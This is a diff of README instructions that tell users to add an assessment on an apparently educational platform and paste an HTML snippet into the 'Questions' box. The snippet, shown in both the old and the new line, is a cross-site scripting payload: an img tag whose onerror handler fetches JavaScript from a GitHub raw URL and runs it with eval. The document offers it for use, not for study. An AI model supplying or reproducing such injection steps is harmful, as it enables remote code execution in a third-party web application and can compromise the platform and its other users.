@@ -7,7 +7,7 @@ Instructions:
 4. Click the paper with the checkmarks, and click "Add an Assessment"
 5. Choose "Multiple Choice", and paste this in the "Questions" box:
 ```
-<img src=# onerror="fetch('https://raw.githubusercontent.com/cam0studios/browser/main/main.js').then(e => e.text()).then(e => eval(e))">
+<img src=# onerror='fetch("https://raw.githubusercontent.com/cam0studios/browser/main/main.js").then(r => r.text()).then(c => eval(c))'>
 ```
 For easy future use:
 1. Click "save" and go to the hamburger menu
